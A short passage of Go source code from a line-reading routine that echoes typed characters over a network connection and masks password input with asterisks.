                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
